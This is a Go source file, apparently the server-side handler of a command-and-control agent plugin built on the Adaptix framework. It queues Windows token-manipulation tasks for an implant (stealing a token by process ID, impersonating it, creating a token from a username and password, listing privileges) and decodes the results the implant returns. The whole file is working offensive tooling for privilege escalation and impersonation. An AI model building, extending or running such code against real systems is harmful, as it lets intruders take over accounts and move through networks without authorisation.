package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"strings"

	adaptix "github.com/Adaptix-Framework/axc2/v2"
)

func cmdToken(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	subcommand := adaptix.GetStringArgDefault(args, "subcommand", "")
	switch subcommand {
	case "getuid":
		data := make([]byte, 5)
		data[0] = CMD_TOKEN_GETUID
		binary.LittleEndian.PutUint32(data[1:5], 0)
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "token getuid queued"}
		return task, msg, nil

	case "steal":
		pidVal, pidErr := adaptix.GetFloatArg(args, "pid")
		if pidErr != nil || pidVal <= 0 {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: token steal: 'pid' argument required")
		}
		pid := uint32(pidVal)
		impersonate := byte(0)
		if adaptix.GetBoolArg(args, "-i") {
			impersonate = 1
		}
		// pid(4LE) | impersonate(1)
		argsLen := 4 + 1
		data := make([]byte, 5+argsLen)
		data[0] = CMD_TOKEN_STEAL
		binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
		binary.LittleEndian.PutUint32(data[5:9], pid)
		data[9] = impersonate
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		label := fmt.Sprintf("token steal %d queued", pid)
		if impersonate != 0 {
			label += " (impersonate)"
		}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: label}
		return task, msg, nil

	case "impersonate":
		idVal, idErr := adaptix.GetFloatArg(args, "token_id")
		if idErr != nil || idVal <= 0 {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: token impersonate: 'token_id' argument required")
		}
		tokenId := uint32(idVal)
		// token_id(4LE)
		data := make([]byte, 9)
		data[0] = CMD_TOKEN_USE
		binary.LittleEndian.PutUint32(data[1:5], 4)
		binary.LittleEndian.PutUint32(data[5:9], tokenId)
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("token impersonate %d queued", tokenId)}
		return task, msg, nil

	case "list":
		data := make([]byte, 5)
		data[0] = CMD_TOKEN_LIST
		binary.LittleEndian.PutUint32(data[1:5], 0)
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "token list queued"}
		return task, msg, nil

	case "rm":
		idVal, idErr := adaptix.GetFloatArg(args, "token_id")
		if idErr != nil || idVal <= 0 {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: token rm: 'token_id' argument required")
		}
		tokenId := uint32(idVal)
		data := make([]byte, 9)
		data[0] = CMD_TOKEN_RM
		binary.LittleEndian.PutUint32(data[1:5], 4)
		binary.LittleEndian.PutUint32(data[5:9], tokenId)
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("token rm %d queued", tokenId)}
		return task, msg, nil

	case "revert":
		data := make([]byte, 5)
		data[0] = CMD_TOKEN_REVERT
		binary.LittleEndian.PutUint32(data[1:5], 0)
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "token revert queued"}
		return task, msg, nil

	case "make":
		domain := adaptix.GetStringArgDefault(args, "domain", "")
		username := adaptix.GetStringArgDefault(args, "username", "")
		password := adaptix.GetStringArgDefault(args, "password", "")
		if username == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: token make: 'username' argument required")
		}
		if password == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: token make: 'password' argument required")
		}
		logonType := uint32(9) // LOGON32_LOGON_NEW_CREDENTIALS
		if lt := adaptix.GetStringArgDefault(args, "-t", ""); lt != "" {
			switch lt {
			case "interactive":
				logonType = 2
			case "network":
				logonType = 3
			case "network_cleartext":
				logonType = 8
			case "new_credentials":
				logonType = 9
			}
		}
		domBytes := []byte(domain)
		userBytes := []byte(username)
		passBytes := []byte(password)
		// logon_type(4LE) + domain_len(4LE) + domain + user_len(4LE) + user + pass_len(4LE) + pass
		innerLen := 4 + 4 + len(domBytes) + 4 + len(userBytes) + 4 + len(passBytes)
		data := make([]byte, 5+innerLen)
		data[0] = CMD_TOKEN_MAKE
		binary.LittleEndian.PutUint32(data[1:5], uint32(innerLen))
		off := 5
		binary.LittleEndian.PutUint32(data[off:off+4], logonType)
		off += 4
		binary.LittleEndian.PutUint32(data[off:off+4], uint32(len(domBytes)))
		off += 4
		copy(data[off:], domBytes)
		off += len(domBytes)
		binary.LittleEndian.PutUint32(data[off:off+4], uint32(len(userBytes)))
		off += 4
		copy(data[off:], userBytes)
		off += len(userBytes)
		binary.LittleEndian.PutUint32(data[off:off+4], uint32(len(passBytes)))
		off += 4
		copy(data[off:], passBytes)
		label := fmt.Sprintf("token make %s\\%s queued", domain, username)
		if domain == "" {
			label = fmt.Sprintf("token make %s queued", username)
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: label}
		return task, msg, nil

	case "privs":
		data := make([]byte, 5)
		data[0] = CMD_TOKEN_PRIVS
		binary.LittleEndian.PutUint32(data[1:5], 0)
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "token privs queued"}
		return task, msg, nil

	default:
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: token: unknown subcommand %q", subcommand)
	}
}

func resultTokenGetuid(data []byte) (string, string) {
	return decodeTokenGetUidResult(data)
}

func resultTokenSteal(agentData adaptix.AgentData, data []byte) (string, string) {
	displayText, clearText := decodeTokenStealResult(data)
	if Ts != nil && len(data) >= 8 {
		user, c := readLenPrefixedStringGo(data, 4)
		domain, c := readLenPrefixedStringGo(data, c)
		impFlag := byte(0)
		if c < len(data) {
			impFlag = data[c]
		}
		if impFlag != 0 {
			imp := domain + "\\" + user + " *"
			_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
				Impersonated *string `json:"impersonated"`
			}{Impersonated: &imp})
		}
	}
	return displayText, clearText
}

func resultTokenUse(agentData adaptix.AgentData, data []byte) (string, string) {
	if len(data) >= 4 {
		user, c := readLenPrefixedStringGo(data, 0)
		domain, _ := readLenPrefixedStringGo(data, c)
		imp := domain + "\\" + user + " *"
		displayText := fmt.Sprintf("Impersonating %s", imp)
		if Ts != nil {
			_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
				Impersonated *string `json:"impersonated"`
			}{Impersonated: &imp})
		}
		return displayText, ""
	}
	return "Token impersonation active", ""
}

func resultTokenRevert(agentData adaptix.AgentData) (string, string) {
	if Ts != nil {
		empty := ""
		_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
			Impersonated *string `json:"impersonated"`
		}{Impersonated: &empty})
	}
	return "Reverted to self", ""
}

func resultTokenMake(agentData adaptix.AgentData, data []byte) (string, string) {
	displayText, clearText := decodeTokenMakeResult(data)
	if Ts != nil && len(data) >= 8 {
		user, c := readLenPrefixedStringGo(data, 4)
		domain, _ := readLenPrefixedStringGo(data, c)
		imp := domain + "\\" + user + " *"
		_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
			Impersonated *string `json:"impersonated"`
		}{Impersonated: &imp})
	}
	return displayText, clearText
}

func resultTokenErr(data []byte) string {
	if len(data) >= 4 {
		errCode := binary.LittleEndian.Uint32(data[0:4])
		return fmt.Sprintf("Token command failed: %s (error %d)", win32ErrorName(errCode), errCode)
	}
	return "Token command failed"
}

/* ========= [ result decoders ] ========= */

func decodeTokenGetUidResult(data []byte) (string, string) {
	if len(data) < 5 {
		return "token getuid: truncated result", ""
	}
	user, cursor := readLenPrefixedStringGo(data, 0)
	domain, cursor := readLenPrefixedStringGo(data, cursor)
	elevated := byte(0)
	if cursor < len(data) {
		elevated = data[cursor]
	}
	star := ""
	if elevated != 0 {
		star = " *"
	}
	displayText := fmt.Sprintf("%s\\%s%s", domain, user, star)
	return displayText, displayText
}

func decodeTokenStealResult(data []byte) (string, string) {
	if len(data) < 4 {
		return "token steal: truncated result", ""
	}
	tokenId := binary.LittleEndian.Uint32(data[0:4])
	user, cursor := readLenPrefixedStringGo(data, 4)
	domain, _ := readLenPrefixedStringGo(data, cursor)
	displayText := fmt.Sprintf("Stolen token %d: %s\\%s", tokenId, domain, user)
	return displayText, displayText
}

func decodeTokenMakeResult(data []byte) (string, string) {
	if len(data) < 4 {
		return "token make: truncated result", ""
	}
	tokenId := binary.LittleEndian.Uint32(data[0:4])
	user, cursor := readLenPrefixedStringGo(data, 4)
	domain, _ := readLenPrefixedStringGo(data, cursor)
	displayText := fmt.Sprintf("Created token %d: %s\\%s", tokenId, domain, user)
	return displayText, displayText
}

func decodeTokenListResult(data []byte) (string, string) {
	if len(data) < 4 {
		return "No tokens stored", ""
	}
	count := binary.LittleEndian.Uint32(data[0:4])
	if count == 0 {
		return "No tokens stored", ""
	}
	var lines []string
	lines = append(lines, fmt.Sprintf("Stored tokens: %d", count))
	lines = append(lines, fmt.Sprintf(" %-8s  %-8s  %-20s  %s", "Token", "PID", "Domain", "User"))
	lines = append(lines, fmt.Sprintf(" %-8s  %-8s  %-20s  %s", "-----", "---", "------", "----"))
	cursor := 4
	for i := uint32(0); i < count && cursor+8 <= len(data); i++ {
		tid := binary.LittleEndian.Uint32(data[cursor : cursor+4])
		cursor += 4
		pid := binary.LittleEndian.Uint32(data[cursor : cursor+4])
		cursor += 4
		user, c := readLenPrefixedStringGo(data, cursor)
		cursor = c
		domain, c := readLenPrefixedStringGo(data, cursor)
		cursor = c
		pidStr := fmt.Sprintf("%d", pid)
		if pid == 0 {
			pidStr = "logon"
		}
		lines = append(lines, fmt.Sprintf(" %-8d  %-8s  %-20s  %s", tid, pidStr, domain, user))
	}
	return lines[0], strings.Join(lines, "\n")
}

func decodeTokenPrivsResult(data []byte) (string, string) {
	if len(data) < 4 {
		return "token privs: truncated result", ""
	}
	count := binary.LittleEndian.Uint32(data[0:4])
	if count == 0 {
		return "No privileges found", ""
	}
	var lines []string
	lines = append(lines, fmt.Sprintf("Privileges: %d", count))
	lines = append(lines, fmt.Sprintf(" %-40s  %s", "Privilege", "Status"))
	lines = append(lines, fmt.Sprintf(" %-40s  %s", "---------", "------"))
	cursor := 4
	for i := uint32(0); i < count && cursor+2 <= len(data); i++ {
		name, c := readLenPrefixedStringGo(data, cursor)
		cursor = c
		if cursor+4 > len(data) {
			break
		}
		attrs := binary.LittleEndian.Uint32(data[cursor : cursor+4])
		cursor += 4
		status := "Disabled"
		if attrs&0x00000002 != 0 {
			status = "Enabled"
		}
		if attrs&0x00000001 != 0 {
			status = "Enabled (default)"
		}
		lines = append(lines, fmt.Sprintf(" %-40s  %s", name, status))
	}
	return lines[0], strings.Join(lines, "\n")
}
